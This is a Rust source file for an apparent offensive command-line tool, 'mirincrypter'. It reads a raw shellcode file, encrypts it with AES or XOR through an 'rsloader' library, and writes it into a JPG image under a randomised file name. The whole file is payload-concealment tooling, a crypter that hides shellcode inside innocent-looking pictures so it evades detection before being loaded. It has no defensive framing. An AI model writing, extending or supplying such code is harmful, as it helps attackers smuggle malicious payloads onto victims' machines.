use clap;
use rand::{distributions::Alphanumeric, Rng};
use std::fs::OpenOptions;

fn main() {
    let yaml = clap::load_yaml!("../resources/mirincrypter_cli.yml");
    let argv = clap::App::from_yaml(yaml).get_matches();

    let mode = match argv.value_of("mode").unwrap() {
        "aes" => "aes",
        "xor" => "xor",
        _ => {
            println!("[+] invalid encrypting mode");
            std::process::exit(0x0100);
        }
    };

    let shellcode_path = argv.value_of("file_path").unwrap();
    let base_pic = argv.value_of("base_pic").unwrap();

    let rand_chars: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(8)
        .map(char::from)
        .collect();

    let output_path = match argv.value_of("out_path") {
        Some(value) => value.to_owned(),
        None => format!(
            "{}{}{}{}{}{}",
            shellcode_path.to_owned(),
            "_",
            rand_chars,
            "_mirin",
            mode,
            ".jpg"
        ),
    };

    let shellcode = match std::fs::read(shellcode_path) {
        Ok(result) => result,
        Err(error) => {
            println!("[+] failed to read shellcode : {:?}", error);
            std::process::exit(0x0100);
        }
    };

    
    println!("[+] read shellcode from {}", shellcode_path);

    if mode == "aes" {
        let sc_object = rsloader::ShellCode {
            sc: shellcode.clone(),
        };
        let aes_shellcode = rsloader::AESShellCode::new(sc_object);
        aes_shellcode.output_to_image(&output_path, &base_pic);
    } else {
        let sc_object = rsloader::ShellCode {
            sc: shellcode.clone(),
        };
        let xor_shellcode = rsloader::XoredShellCode::new(sc_object);
        xor_shellcode.output_to_image(&output_path, &base_pic);
    }
}
